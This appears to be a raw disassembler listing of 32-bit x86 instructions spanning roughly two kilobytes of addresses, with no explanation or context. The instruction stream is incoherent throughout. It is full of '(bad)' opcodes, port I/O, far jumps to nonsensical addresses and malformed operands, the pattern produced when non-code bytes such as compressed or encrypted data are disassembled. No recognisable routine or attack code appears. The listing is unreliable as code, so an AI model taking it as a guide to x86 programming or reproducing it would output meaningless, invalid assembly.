  415d23:	test   eax,0x8e23b5af
  415d28:	jmp    0x83e2ea45
  415d2d:	pusha  
  415d2e:	out    dx,eax
  415d2f:	and    DWORD PTR [ecx],eax
  415d31:	sub    ebp,ebp
  415d33:	mov    dl,0xe6
  415d35:	fld    QWORD PTR [eax]
  415d37:	or     BYTE PTR [ecx-0x47],dh
  415d3a:	lods   eax,DWORD PTR ds:[esi]
  415d3b:	lds    edi,FWORD PTR [eax]
  415d3d:	hlt    
  415d3e:	repnz pusha 
  415d40:	adc    ebx,DWORD PTR [ecx]
  415d42:	stc    
  415d43:	or     edx,DWORD PTR [eax-0x68de394f]
  415d49:	loop   0x415dc8
  415d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4c:	xchg   esi,eax
  415d4d:	jg     0x415dc6
  415d4f:	loopne 0x415d47
  415d51:	cmp    ecx,DWORD PTR ds:0x58205ce4
  415d57:	mov    esp,0x16c76638
  415d5c:	daa    
  415d5d:	daa    
  415d5e:	daa    
  415d5f:	mov    esi,0xcaf22a54
  415d64:	shl    DWORD PTR [ecx-0x144f9dd6],1
  415d6a:	clc    
  415d6b:	mov    bh,0xe2
  415d6d:	(bad)  
  415d6e:	jnp    0x415dbe
  415d70:	pop    ds
  415d71:	pop    ds
  415d72:	mov    al,bh
  415d74:	mov    esp,0x402e0611
  415d79:	sar    DWORD PTR [edi+ebx*8],cl
  415d7c:	pushf  
  415d7d:	imul   esi,DWORD PTR [ebp+0x38],0x5db9bc0f
  415d84:	shl    BYTE PTR [ebx],1
  415d86:	inc    edi
  415d87:	sbb    BYTE PTR [edx+0x60],ah
  415d8a:	int3   
  415d8b:	fisttp WORD PTR [esi+edi*2+0x74b6cba7]
  415d92:	mov    bh,0x4b
  415d94:	test   al,0xf4
  415d96:	cmp    ebx,ebp
  415d98:	jecxz  0x415d82
  415d9a:	cs out 0x38,al
  415d9d:	mov    eax,0xc8a51a7d
  415da2:	hlt    
  415da3:	xchg   esi,eax
  415da4:	pop    ecx
  415da5:	adc    BYTE PTR [ecx+0x6f],ch
  415da8:	ds mov ecx,0x50c1c938
  415dae:	cmp    DWORD PTR [esi+0x7f16cab7],ebp
  415db4:	jae    0x415d70
  415db6:	xor    esp,ebp
  415db8:	mov    ch,0xaa
  415dba:	cmp    esp,edi
  415dbc:	xchg   edi,eax
  415dbd:	add    ah,BYTE PTR [edx+eiz*2]
  415dc0:	xor    eax,0xd4aee3b2
  415dc5:	mov    dh,0xab
  415dc7:	jns    0x415db4
  415dc9:	pop    esi
  415dca:	stos   BYTE PTR es:[edi],al
  415dcb:	mov    ecx,DWORD PTR ds:0x8177fff0
  415dd1:	in     eax,dx
  415dd2:	push   ss
  415dd3:	or     ebx,0x860034a4
  415dd9:	cmp    cl,ah
  415ddb:	mov    bh,0xa0
  415ddd:	out    dx,eax
  415dde:	push   cs
  415ddf:	sbb    BYTE PTR [edi+0x63],dl
  415de2:	mov    DWORD PTR gs:[edi+0x13],edx
  415de6:	ss and eax,0x2c9c9798
  415dec:	shl    DWORD PTR [eax-0x3457bd6b],1
  415df2:	fwait
  415df3:	call   0x466ee9f2
  415df8:	test   BYTE PTR ds:[eax-0x4e30364a],ah
  415dff:	or     BYTE PTR [eax],bh
  415e01:	mov    BYTE PTR [ecx],ch
  415e03:	pop    eax
  415e04:	push   edi
  415e05:	push   ebp
  415e06:	push   ebx
  415e07:	sbb    BYTE PTR [esi+0x6],ch
  415e0a:	les    ebp,FWORD PTR [ebp-0x35aaefb6]
  415e10:	ret    0x3811
  415e13:	jg     0x415e94
  415e15:	xchg   al,dh
  415e17:	xchg   ebx,eax
  415e18:	push   ebx
  415e19:	inc    ebp
  415e1a:	ret    0x895
  415e1d:	add    eax,0x15c3f2d4
  415e22:	rol    BYTE PTR [edi+edi*1],0x50
  415e26:	push   es
  415e27:	sti    
  415e28:	mov    ah,0xec
  415e2a:	in     al,0x3d
  415e2c:	jl     0x415dbd
  415e2e:	(bad)  
  415e30:	fist   DWORD PTR [ecx-0x7]
  415e33:	or     DWORD PTR [eax],edi
  415e35:	sub    BYTE PTR [ecx-0x72],cl
  415e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e39:	cld    
  415e3a:	nop
  415e3b:	fistp  QWORD PTR [ebp+0x495a4eca]
  415e41:	push   edx
  415e42:	fs jmp 0x415dea
  415e45:	in     eax,dx
  415e46:	and    BYTE PTR [ebp-0x30a16663],ah
  415e4c:	dec    esp
  415e4d:	xchg   ecx,eax
  415e4e:	pop    esi
  415e4f:	fnstsw WORD PTR [eax]
  415e51:	ins    DWORD PTR es:[edi],dx
  415e52:	les    eax,FWORD PTR [esi]
  415e54:	icebp  
  415e55:	mov    ecx,0x85a933d4
  415e5a:	or     DWORD PTR [edx],esi
  415e5c:	inc    esp
  415e5d:	mov    edi,edi
  415e5f:	(bad)  
  415e60:	les    ebx,FWORD PTR [edx-0x3dcd1bcd]
  415e66:	lahf   
  415e67:	and    al,0x4
  415e69:	sub    al,al
  415e6b:	arpl   WORD PTR [ecx],ax
  415e6d:	rcr    DWORD PTR [ebp-0x68],cl
  415e70:	inc    ebp
  415e71:	inc    eax
  415e72:	fidiv  DWORD PTR [ebp+0x77b61354]
  415e78:	cwde   
  415e79:	cdq    
  415e7a:	inc    BYTE PTR [edi+0x66]
  415e7d:	(bad)  
  415e7e:	out    dx,eax
  415e7f:	pop    esi
  415e80:	mov    edx,DWORD PTR ds:0xb1c74334
  415e86:	(bad)  [ebx+edx*1+0x3ed51913]
  415e8d:	jle    0x415ef2
  415e8f:	sub    eax,0x52f99518
  415e94:	cmp    dh,BYTE PTR [ecx+0x84be430]
  415e9a:	cmp    ah,BYTE PTR [eax-0x4656c9e7]
  415ea0:	out    dx,eax
  415ea1:	push   0xffffffc5
  415ea3:	dec    edx
  415ea4:	and    DWORD PTR [eax-0x18d8bffa],edx
  415eaa:	xchg   edx,eax
  415eab:	inc    esi
  415eac:	xor    eax,0xd2d682bf
  415eb1:	push   esp
  415eb2:	ja     0x415eff
  415eb4:	cmp    ecx,DWORD PTR [esi+0x2f747244]
  415eba:	sbb    eax,0x6fb2719b
  415ebf:	shr    DWORD PTR [eax],cl
  415ec1:	push   ebx
  415ec2:	popa   
  415ec3:	ret    
  415ec4:	ror    DWORD PTR [esi+eiz*8-0x66],1
  415ec8:	ss xor al,0xd8
  415ecb:	pop    ds
  415ecc:	hlt    
  415ecd:	mov    cl,0x70
  415ecf:	mov    DWORD PTR [esi],ecx
  415ed1:	inc    eax
  415ed2:	cmp    BYTE PTR [ecx+edi*1-0x42fc9271],dh
  415ed9:	sti    
  415eda:	shr    BYTE PTR [eax],0x57
  415edd:	sbb    al,0xbf
  415edf:	iret   
  415ee0:	iret   
  415ee1:	dec    edi
  415ee2:	pop    es
  415ee3:	or     ah,bh
  415ee5:	mov    DWORD PTR [ebx+0x42242937],esi
  415eeb:	push   edi
  415eec:	adc    al,cl
  415eee:	pop    edi
  415eef:	scas   eax,DWORD PTR es:[edi]
  415ef0:	shl    DWORD PTR [ecx],1
  415ef2:	cmp    al,al
  415ef4:	lahf   
  415ef5:	jp     0x415eda
  415ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef8:	xor    al,0x82
  415efa:	into   
  415efb:	adc    al,0x7e
  415efd:	xor    DWORD PTR [esi],eax
  415eff:	mov    DWORD PTR [ebx+0x44c45d9c],eax
  415f05:	imul   DWORD PTR [ecx-0x1]
  415f08:	hlt    
  415f09:	mov    esp,0x681394a8
  415f0e:	cwde   
  415f0f:	leave  
  415f10:	clc    
  415f11:	enter  0x4747,0xd9
  415f15:	jne    0x415ec1
  415f17:	sub    BYTE PTR [ebp+0xe1e2d6e],bl
  415f1d:	test   eax,0x6b993bbb
  415f22:	push   ds
  415f23:	repz xchg ebp,eax
  415f25:	adc    al,BYTE PTR [edi]
  415f27:	dec    edx
  415f28:	mov    DWORD PTR [ecx-0x4a],esi
  415f2b:	dec    edi
  415f2c:	jns    0x415ef6
  415f2e:	jmp    0x701b:0x1166c87a
  415f35:	fcomp  DWORD PTR [ebx]
  415f37:	push   ecx
  415f38:	sbb    BYTE PTR [edx],al
  415f3a:	rcr    DWORD PTR [eax-0x4cc31b82],0x3f
  415f41:	daa    
  415f42:	or     bh,bh
  415f44:	aam    0xf7
  415f46:	add    BYTE PTR [edx],dh
  415f48:	retf   0x6f94
  415f4b:	mov    dh,0xfe
  415f4d:	shr    BYTE PTR [edi],1
  415f4f:	jae    0x415f3c
  415f51:	mov    eax,ds:0x5666cf76
  415f56:	push   es
  415f57:	loope  0x415f62
  415f59:	adc    ch,cl
  415f5b:	lds    edx,FWORD PTR [edi-0x256031ac]
  415f61:	xchg   ecx,eax
  415f62:	pop    ss
  415f63:	pop    esi
  415f64:	jae    0x415f20
  415f66:	push   edx
  415f67:	and    ebp,DWORD PTR [esi-0x57]
  415f6a:	popf   
  415f6b:	aam    0xa0
  415f6d:	or     BYTE PTR [edx+eax*2],0xbf
  415f71:	mov    esp,0xf4180286
  415f76:	xchg   esi,eax
  415f77:	test   DWORD PTR ds:0x3744e56b,ecx
  415f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7e:	or     al,0xa5
  415f80:	adc    BYTE PTR [edx+ebp*4],al
  415f83:	(bad)  
  415f84:	mul    BYTE PTR [esi]
  415f86:	sub    al,0xdf
  415f88:	fdiv   st(4),st
  415f8a:	inc    ebp
  415f8b:	les    edx,FWORD PTR [ebx-0x4]
  415f8e:	retf   
  415f8f:	lea    edi,ds:0x9dadb1e3
  415f95:	adc    bl,0x62
  415f98:	add    al,0xd7
  415f9a:	scas   al,BYTE PTR es:[edi]
  415f9b:	fiadd  DWORD PTR [esi+edx*1-0x1deebd33]
  415fa2:	push   ebx
  415fa3:	stc    
  415fa4:	cmp    cl,BYTE PTR [ebx-0x4a]
  415fa7:	out    dx,al
  415fa8:	pusha  
  415fa9:	inc    esp
  415faa:	mov    ah,0x82
  415fac:	daa    
  415fad:	aaa    
  415fae:	mov    ds:0x72de6fb,al
  415fb3:	cmp    DWORD PTR [edx],edx
  415fb5:	sbb    BYTE PTR [edx-0x2d],ch
  415fb8:	std    
  415fb9:	fdiv   QWORD PTR [ebx]
  415fbb:	pop    ds
  415fbc:	and    al,0x3b
  415fbe:	(bad)  
  415fbf:	ja     0x415ff8
  415fc1:	and    BYTE PTR [ebp-0x60],0x8
  415fc5:	stos   DWORD PTR es:[edi],eax
  415fc6:	push   0xcec8c64
  415fcb:	loop   0x415fee
  415fcd:	mul    DWORD PTR ds:0x14f838b7
  415fd3:	or     al,ch
  415fd5:	mov    ch,0x9d
  415fd7:	mov    dl,0x49
  415fd9:	and    esp,DWORD PTR [ecx+0xbdcbf]
  415fdf:	push   es
  415fe0:	icebp  
  415fe1:	mov    ebx,0xd21cd9f0
  415fe6:	pop    ecx
  415fe7:	xchg   DWORD PTR [ebx-0x3f],edx
  415fea:	xchg   dl,dh
  415fec:	in     eax,dx
  415fed:	mov    edi,0xcf151161
  415ff2:	pop    edx
  415ff3:	xchg   esi,eax
  415ff4:	ins    BYTE PTR es:[edi],dx
  415ff5:	(bad)  
  415ff6:	in     eax,dx
  415ff7:	(bad)  
  415ff8:	lock out dx,eax
  415ffa:	cmp    eax,0xe7524589
  415fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416000:	jmp    0x416052
  416002:	fld    st(4)
  416004:	mov    ds:0x1218e63b,al
  416009:	xor    edx,ebx
  41600b:	shr    BYTE PTR ds:0x19fc5213,0xb3
  416012:	add    DWORD PTR [esi],edx
  416014:	mov    bh,0xdd
  416016:	mov    al,0x8a
  416018:	pop    edx
  416019:	cwde   
  41601a:	sar    DWORD PTR [ebp+0x642f7269],0x65
  416021:	xchg   ecx,eax
  416022:	stc    
  416023:	mov    dh,0x4a
  416025:	cmp    al,0xc6
  416027:	fmulp  st(7),st
  416029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602a:	fs inc ebx
  41602c:	add    eax,0x704beead
  416031:	jmp    0x84da:0xc1794f73
  416038:	(bad)  
  416039:	or     al,0x99
  41603b:	add    BYTE PTR [ebx+0x1c],cl
  41603e:	out    0x30,al
  416040:	mov    ebx,0x1dc59d3c
  416045:	enter  0xbd82,0x27
  416049:	in     al,0x6
  41604b:	push   0xc1bbdcdb
  416050:	(bad)  
  416051:	adc    ah,BYTE PTR [edi+0x50]
  416054:	lods   eax,DWORD PTR ds:[esi]
  416055:	jl     0x4160a4
  416057:	push   esi
  416058:	pop    esp
  416059:	retf   
  41605a:	test   eax,0x6740e10c
  41605f:	scas   eax,DWORD PTR es:[edi]
  416060:	leave  
  416061:	cli    
  416062:	inc    eax
  416063:	and    bl,BYTE PTR [esp+ebp*4]
  416066:	shl    BYTE PTR [edx+0x7b6cef52],0x45
  41606d:	(bad)  
  41606e:	dec    ebx
  41606f:	inc    edi
  416070:	(bad)  
  416071:	cld    
  416072:	scas   al,BYTE PTR es:[edi]
  416073:	in     eax,0x9f
  416075:	in     eax,0xc7
  416077:	jno    0x4160db
  416079:	sub    DWORD PTR [ecx-0x1da048ff],edx
  41607f:	cs (bad) 
  416081:	cmp    eax,0x7bd5acda
  416086:	iret   
  416087:	or     dl,bh
  416089:	in     eax,dx
  41608a:	mov    ebp,0xd8f9fdd4
  41608f:	mov    dl,0x14
  416091:	xchg   ebp,eax
  416092:	mov    eax,ds:0xb26547af
  416097:	pop    eax
  416098:	and    ebp,DWORD PTR [edi]
  41609a:	ins    BYTE PTR es:[edi],dx
  41609b:	shr    BYTE PTR [esi+0x55],0x15
  41609f:	jae    0x4160be
  4160a1:	ds mov edx,0xf35b595b
  4160a7:	mov    WORD PTR [eax-0x7d7eace7],?
  4160ad:	mov    ecx,0x949803b8
  4160b2:	fcmovne st,st(5)
  4160b4:	fldcw  WORD PTR [esi-0x59ca5e83]
  4160ba:	loopne 0x41604f
  4160bc:	mov    bl,0x91
  4160be:	daa    
  4160bf:	dec    ebp
  4160c0:	mov    edi,0x3622db9a
  4160c5:	sbb    DWORD PTR ds:0xd637121a,ebx
  4160cb:	call   0x5ba87c19
  4160d0:	mov    esp,0x92795ea
  4160d5:	add    DWORD PTR [ecx+0x2],0x522ec101
  4160dc:	dec    ebx
  4160dd:	xchg   ebx,eax
  4160de:	lahf   
  4160df:	cld    
  4160e0:	data16 mov BYTE PTR [ecx+0x2aaa56a4],bl
  4160e7:	push   ss
  4160e8:	jne    0x2ee328a7
  4160ee:	or     dh,BYTE PTR [ebp-0x64]
  4160f1:	ss mov ebp,0x57face16
  4160f7:	inc    esi
  4160f8:	js     0x4160e1
  4160fa:	xchg   edx,eax
  4160fb:	int    0x92
  4160fd:	lods   al,BYTE PTR ds:[esi]
  4160fe:	jle    0x4160e3
  416100:	xrelease lock add DWORD PTR [ecx-0xf],esi
  416105:	in     al,0xe6
  416107:	stos   BYTE PTR es:[edi],al
  416108:	push   esp
  416109:	popf   
  41610a:	outs   dx,BYTE PTR ds:[esi]
  41610b:	xor    BYTE PTR [esi+0xcade056],al
  416111:	out    0xa,al
  416113:	pop    es
  416114:	pop    ebp
  416115:	pop    edi
  416116:	test   BYTE PTR [edi+eax*2-0x58],al
  41611a:	fst    DWORD PTR [eax+0x4f020727]
  416120:	aad    0xbd
  416122:	out    0x16,al
  416124:	leave  
  416125:	inc    ebp
  416126:	ror    DWORD PTR [edi+0x44],0x42
  41612a:	mov    eax,0xfbe2ac38
  41612f:	call   0xdbaec896
  416134:	dec    ecx
  416135:	mov    al,ds:0x6fe63a85
  41613a:	add    DWORD PTR [edi+0x447a89c0],edi
  416140:	push   ss
  416141:	leave  
  416142:	push   edx
  416143:	dec    eax
  416144:	cmp    edx,edx
  416146:	pop    ebx
  416147:	mov    ebx,0x36b989be
  41614c:	lods   eax,DWORD PTR ds:[esi]
  41614d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41614e:	xlat   BYTE PTR es:[ebx]
  416150:	pop    ecx
  416151:	or     BYTE PTR [eax-0x34ff9e8d],ch
  416157:	jae    0x4160f0
  416159:	in     al,dx
  41615a:	fiadd  DWORD PTR [ecx-0x62812b46]
  416160:	push   0x5b8dd23a
  416165:	jae    0x4161ca
  416167:	mov    bl,al
  416169:	pop    ecx
  41616a:	push   0xc
  41616c:	lea    esp,[ebp-0x47]
  41616f:	mov    cl,0x7c
  416171:	push   ss
  416172:	xor    DWORD PTR cs:[edi+0x698ebc73],0xffffffee
  41617a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41617b:	cmp    eax,DWORD PTR [esi-0x3a]
  41617e:	pop    eax
  41617f:	and    ch,BYTE PTR [ebx+0x13cfc1b2]
  416185:	daa    
  416186:	cmp    ah,cl
  416188:	pop    ds
  416189:	jae    0x41619b
  41618b:	sbb    DWORD PTR [ebp+0x372ff831],ecx
  416191:	sbb    ecx,edx
  416193:	mov    esi,0x572a1ae4
  416198:	or     DWORD PTR ds:0x30d1d6b7,esp
  41619e:	dec    edx
  41619f:	mov    ebx,0x744f07dd
  4161a4:	inc    esp
  4161a5:	in     eax,0x3c
  4161a7:	xor    ebx,ebx
  4161a9:	sbb    eax,0x1a37fe2b
  4161ae:	out    dx,eax
  4161af:	ss shl bh,0xc9
  4161b3:	mov    eax,ds:0x799429e6
  4161b8:	or     eax,0x90d636bb
  4161bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161be:	and    ebx,DWORD PTR [ecx+0x37e1c664]
  4161c4:	pop    ebp
  4161c5:	jb     0x4161af
  4161c7:	call   0x5ed09da0
  4161cc:	mov    BYTE PTR [ecx+0x4],al
  4161cf:	call   0xd7da:0xa2ced45c
  4161d6:	pop    es
  4161d7:	in     eax,0x39
  4161d9:	lock sbb al,BYTE PTR es:[ebx+0x5b]
  4161de:	pop    ebx
  4161df:	xchg   BYTE PTR [edi-0x3],dl
  4161e2:	xchg   esi,eax
  4161e3:	adc    DWORD PTR [ecx+0x3e],0xffffffb0
  4161e7:	push   ds
  4161e8:	aas    
  4161e9:	ins    BYTE PTR es:[edi],dx
  4161ea:	dec    ebx
  4161eb:	lea    esi,[ecx]
  4161ed:	(bad)  
  4161ee:	jl     0x4161a7
  4161f0:	imul   BYTE PTR [edi]
  4161f2:	xchg   ebx,eax
  4161f3:	add    al,0x69
  4161f5:	mov    dl,ah
  4161f7:	dec    esp
  4161f8:	and    BYTE PTR ds:0xb4dfc6c9,al
  4161fe:	xchg   edi,eax
  4161ff:	pusha  
  416200:	sahf   
  416201:	loopne 0x4161ff
  416203:	addr16 mov ds:0x5f9a,al
  416207:	retf   0xa684
  41620a:	test   al,0x98
  41620c:	push   edx
  41620d:	and    dl,BYTE PTR [esi-0x730443dd]
  416213:	ja     0x41620e
  416215:	mov    cl,0x7a
  416217:	jnp    0x41619d
  416219:	push   0x7ddffbc9
  41621e:	fldenv [ebx]
  416220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416221:	dec    edx
  416222:	jmp    0x82f8:0x3c973d51
  416229:	xchg   edi,eax
  41622a:	sub    ch,BYTE PTR ds:0xe96e4989
  416230:	sub    ebp,edx
  416232:	mov    bl,0x17
  416234:	jb     0x416244
  416236:	cmc    
  416237:	sub    eax,0x43067d46
  41623c:	adc    DWORD PTR [ebp-0x6],eax
  41623f:	shr    eax,0xeb
  416242:	push   edx
  416243:	jnp    0x416280
  416245:	xor    eax,0x1f20ab41
  41624a:	mov    bh,0x59
  41624c:	jo     0x4161d8
  41624e:	clc    
  41624f:	cs dec esi
  416251:	or     edi,DWORD PTR [esi+0xfb1075d]
  416257:	outs   dx,WORD PTR ds:[esi]
  416259:	xor    DWORD PTR [eax+0x6b2087a5],ecx
  41625f:	mov    ecx,DWORD PTR ds:0x4187dfa6
  416265:	retf   0x8d29
  416268:	push   es
  416269:	or     ebp,esi
  41626b:	jecxz  0x4162c2
  41626d:	mov    dh,0xe2
  41626f:	(bad)  
  416270:	mov    eax,0x47dc7b22
  416275:	jecxz  0x4162ae
  416277:	xchg   edi,eax
  416278:	int    0xba
  41627a:	mov    ecx,0x15b92560
  41627f:	(bad)  
  416280:	dec    esp
  416281:	or     esi,DWORD PTR [eax-0x10]
  416284:	loopne 0x416305
  416286:	ror    BYTE PTR [edx-0x48],cl
  416289:	iret   
  41628a:	stos   BYTE PTR es:[edi],al
  41628b:	dec    esp
  41628c:	rol    DWORD PTR [edi-0x66],0x24
  416290:	adc    DWORD PTR [ebx-0x27],edi
  416293:	or     al,0xb9
  416295:	mov    bh,0x6
  416297:	mov    ds:0x1e0ec1d8,eax
  41629c:	and    esi,eax
  41629e:	shl    bh,1
  4162a0:	ss jmp 0x416296
  4162a3:	fstp   QWORD PTR [edi+edx*4-0x160dd094]
  4162aa:	adc    DWORD PTR [ecx],esp
  4162ac:	mov    al,0x8e
  4162ae:	stos   DWORD PTR es:[edi],eax
  4162af:	es mov eax,0xdb337fba
  4162b5:	add    DWORD PTR [edi],esp
  4162b7:	pop    edi
  4162b8:	in     eax,dx
  4162b9:	xchg   edx,eax
  4162ba:	jecxz  0x41627a
  4162bc:	push   ebp
  4162bd:	cmp    cl,dh
  4162bf:	xor    dl,BYTE PTR [ebp+0x686a70ca]
  4162c5:	push   esi
  4162c6:	cs call 0xb2ee:0x413b8b58
  4162ce:	sar    DWORD PTR [ecx],1
  4162d0:	jmp    0xd16029e1
  4162d5:	inc    esi
  4162d6:	popa   
  4162d7:	div    DWORD PTR [edi-0x3c49b17e]
  4162dd:	mov    esi,0x994d29fb
  4162e2:	sbb    esi,esi
  4162e4:	scas   eax,DWORD PTR es:[edi]
  4162e5:	repnz stos DWORD PTR es:[edi],eax
  4162e7:	mov    cl,BYTE PTR ds:0x394dc2ca
  4162ed:	inc    esi
  4162ee:	out    0x20,al
  4162f0:	cmp    al,0x65
  4162f2:	push   ebx
  4162f3:	pop    ebp
  4162f4:	call   0x89c00b5f
  4162f9:	jge    0x41631a
  4162fb:	xor    esi,ebx
  4162fd:	push   ds
  4162fe:	test   BYTE PTR [ecx+0x178c4e7a],bh
  416304:	pop    esp
  416305:	inc    esi
  416306:	into   
  416307:	bound  eax,QWORD PTR [ecx]
  416309:	sbb    al,BYTE PTR [esi]
  41630b:	jl     0x41631b
  41630d:	aas    
  41630e:	xlat   BYTE PTR ds:[ebx]
  41630f:	inc    edi
  416310:	pop    eax
  416311:	mov    esi,0xa27518a8
  416316:	loopne 0x4162db
  416318:	and    DWORD PTR [ebx-0x33],edi
  41631b:	mov    ah,BYTE PTR [edi+0x598397a6]
  416321:	in     al,0xfc
  416323:	out    dx,al
  416324:	push   eax
  416325:	(bad)  
  416326:	push   edi
  416327:	test   BYTE PTR [edx],0x76
  41632a:	and    al,0x54
  41632c:	mov    al,0x93
  41632e:	jbe    0x4163ae
  416330:	jo     0x416349
  416332:	xchg   BYTE PTR [esi+edi*8+0x28],ah
  416336:	mov    fs,WORD PTR [ebp-0xb]
  416339:	icebp  
  41633a:	aas    
  41633b:	mov    esp,0xa8a34898
  416340:	mov    ?,ebx
  416342:	enter  0xbbf1,0xae
  416346:	jno    0x4162e4
  416348:	mov    DWORD PTR ds:0xf9ef8865,ebx
  41634e:	adc    edx,ebp
  416350:	call   0xd130:0x611852de
  416357:	out    dx,eax
  416358:	mov    edx,0xc5b89dff
  41635d:	jmp    0x4163a4
  41635f:	cmp    BYTE PTR [edi+0x40],cl
  416362:	xor    al,0x8c
  416364:	add    al,0xea
  416366:	dec    ecx
  416367:	std    
  416368:	push   ecx
  416369:	ror    DWORD PTR [ecx+0x3d435bf5],cl
  41636f:	fsub   DWORD PTR ds:0xe8ceb173
  416376:	sbb    DWORD PTR [esi],eax
  416378:	xchg   DWORD PTR [eax-0x3a],ebx
  41637b:	test   cl,al
  41637d:	mov    eax,ds:0xe947aacf
  416382:	push   0xfffffff2
  416384:	pop    ss
  416385:	in     al,dx
  416386:	fisttp WORD PTR [ecx+0xb18c887]
  41638c:	enter  0x720e,0x78
  416390:	push   ss
  416391:	xchg   cl,ch
  416393:	sbb    dh,BYTE PTR [ebx+0x63]
  416396:	bound  edi,QWORD PTR [edx-0x35]
  416399:	mov    ch,BYTE PTR [edi]
  41639b:	dec    esi
  41639c:	sbb    al,0xb9
  41639e:	in     eax,dx
  41639f:	les    esi,FWORD PTR [eax-0x1b2a41c8]
  4163a5:	fnstcw WORD PTR [edx-0x4b]
  4163a8:	loop   0x4163a0
  4163aa:	xchg   DWORD PTR [ecx-0x4],ebx
  4163ad:	inc    eax
  4163ae:	shl    esp,0xe7
  4163b1:	adc    DWORD PTR [edi],esi
  4163b3:	leave  
  4163b4:	push   cs
  4163b5:	sub    al,0x87
  4163b7:	dec    eax
  4163b8:	dec    ebx
  4163b9:	or     al,0x17
  4163bb:	shr    DWORD PTR [eax],0xe8
  4163be:	loope  0x4163b7
  4163c0:	xor    eax,0x75c501c7
  4163c5:	mov    ds:0x588f8a27,al
  4163ca:	xchg   ecx,eax
  4163cb:	mov    edi,0x67a4446a
  4163d0:	pop    esp
  4163d1:	sub    ebx,edx
  4163d3:	ss jno 0x41642d
  4163d6:	cs jae 0x416454
  4163d9:	or     eax,0xea4d332c
  4163de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163df:	aam    0x65
  4163e1:	retf   0x6de6
  4163e4:	mov    ch,0x53
  4163e6:	repz cmp al,0xe7
  4163e9:	out    0x54,al
  4163eb:	pop    ecx
  4163ec:	dec    eax
  4163ed:	dec    ebx
  4163ee:	fimul  WORD PTR [esi]
  4163f0:	repz push ds
  4163f2:	fdivr  QWORD PTR [ebx+0x2b]
  4163f5:	clc    
  4163f6:	fbstp  TBYTE PTR [ebx]
  4163f8:	push   edi
  4163f9:	cmp    edi,edi
  4163fb:	push   edi
  4163fc:	add    ebp,DWORD PTR [ebp+0x48]
  4163ff:	pop    es
  416400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416401:	in     eax,dx
  416402:	test   bh,0xb5
  416405:	shr    DWORD PTR [ebp+0x6539f3ea],1
  41640b:	adc    ebp,ecx
  41640d:	push   ecx
  41640e:	mov    esi,0xff007057
  416413:	mov    ebx,0x5fb9984b
  416418:	mov    eax,ds
  41641a:	leave  
  41641b:	inc    esp
  41641c:	test   eax,0xad244827
  416421:	enter  0x4fa4,0xf1
  416425:	cmp    BYTE PTR [eax+0x1c],bh
  416428:	sub    eax,0xd1b38989
  41642d:	and    eax,0x3f92fb9
  416432:	in     eax,dx
  416433:	lea    ebp,[ebx+edi*2-0x71]
  416437:	sub    BYTE PTR [esi],cl
  416439:	sti    
  41643a:	cmp    esi,esi
  41643c:	outs   dx,BYTE PTR ds:[esi]
  41643d:	mov    al,0xb
  41643f:	sbb    BYTE PTR [ecx+edx*2-0x5a7348a3],0xc5
  416447:	mov    ds:0x82113771,al
  41644c:	popf   
  41644d:	das    
  41644e:	push   ebx
  41644f:	aad    0xca
  416451:	sub    al,0x2b
  416453:	fcmovu st,st(3)
  416455:	popaw  
  416457:	lahf   
  416458:	stc    
  416459:	pusha  
  41645a:	jmp    0x416431
  41645c:	retf   
  41645d:	pop    eax
  41645e:	loopne 0x416490
  416460:	daa    
  416461:	sbb    dl,BYTE PTR [ecx]
  416463:	cdq    
  416464:	cmp    ebp,DWORD PTR [edx+ebp*4-0x37]
  416468:	out    0x2e,al
  41646a:	ds dec ebp
  41646c:	sbb    DWORD PTR [ebx],edi
  41646e:	pop    ecx
  41646f:	pop    esp
  416470:	stos   DWORD PTR es:[edi],eax
  416471:	jp     0x416496
  416473:	jmp    0x7a58:0xe27c5ffa
  41647a:	jbe    0x416474
  41647c:	ret    0x338c
  41647f:	cld    
  416480:	push   0xffffffa7
  416482:	pushf  
  416483:	(bad)  
  416484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416485:	sub    eax,0x722415b6
  41648a:	gs jae 0x416486
  41648d:	scas   eax,DWORD PTR es:[edi]
  41648e:	cmc    
  41648f:	and    al,0x98
  416491:	pop    DWORD PTR [ebx-0x49]
  416494:	cmp    al,0x18
  416496:	sbb    DWORD PTR [eax+0x73],ebp
  416499:	or     BYTE PTR es:[eax-0x17],bl
  41649d:	lods   eax,DWORD PTR ds:[esi]
  41649e:	jo     0x416434
  4164a0:	lods   al,BYTE PTR ds:[esi]
  4164a1:	sub    ebp,ecx
  4164a3:	pop    es
  4164a4:	or     edi,edx
  4164a6:	or     bh,BYTE PTR [esi]
  4164a8:	push   ss
  4164a9:	loope  0x41644d
  4164ab:	mov    ds:0xb4fe0f9e,eax
  4164b0:	test   al,0x67
  4164b2:	or     al,dl
  4164b4:	xchg   DWORD PTR [ebx],ebx
  4164b6:	mov    ch,0x9c
  4164b8:	div    BYTE PTR [edi]
  4164ba:	dec    eax
  4164bb:	dec    edx
  4164bc:	fldenv [ecx+0x68]
  4164bf:	xor    ch,BYTE PTR [esi+0x710f20a0]
  4164c5:	add    BYTE PTR [ecx+0x2c25879e],ch
  4164cb:	mov    al,dh
  4164cd:	xchg   esp,eax
  4164ce:	push   ds
  4164cf:	xchg   ebx,eax
  4164d0:	aam    0x9f
  4164d2:	fdiv   QWORD PTR [edx]
  4164d4:	in     eax,dx
  4164d5:	add    BYTE PTR [edi-0x57],bh
  4164d8:	push   0x182211c7
  4164dd:	int    0x5c
  4164df:	ja     0x4164bd
  4164e1:	ss lahf 
  4164e3:	pop    esi
  4164e4:	enter  0x6848,0xf0
  4164e8:	loopne 0x416532
  4164ea:	cs jp  0x41655e
  4164ed:	aaa    
  4164ee:	ret    
  4164ef:	xor    al,0xd8
  4164f1:	xchg   esi,eax
  4164f2:	je     0x41656e
  4164f4:	jecxz  0x4164b0
